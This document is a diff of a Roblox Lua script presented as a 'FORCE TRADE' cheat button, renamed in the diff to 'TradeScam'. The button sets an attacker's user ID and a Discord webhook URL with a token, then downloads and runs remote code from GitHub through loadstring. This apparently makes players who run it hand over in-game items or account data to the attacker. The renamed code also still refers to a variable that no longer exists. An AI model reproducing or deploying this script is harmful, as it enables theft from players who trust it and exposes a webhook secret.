@@ -1,11 +1,11 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("(TSD_DOGE) FORCE TRADE CURRENT STATUS: OWNER", "Midnight")
+local Window = Library.CreateLib("(TSD_DOGE) TradeScam CURRENT STATUS: OWNER", "Midnight")
 
-local FORCETRADE = Window:NewTab("FORCETRADE")
-local FORCETRADESection = FORCETRADE:NewSection("FORCETRADE")
+local TradeScam = Window:NewTab("TradeScam")
+local TradeScamSection = FORCETRADE:NewSection("TradeScam")
 
-FORCETRADESection:NewButton("FORCETRADE", "FORCETRADE!!", function()
-UserName = "jiegamingstido"
-WebHook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
+TradeScamSection:NewButton("TradeScam", "TradeScam!!", function()
+_G.UserID = 1516599524;
+_G.Webhook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm";
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua"))();
 end)
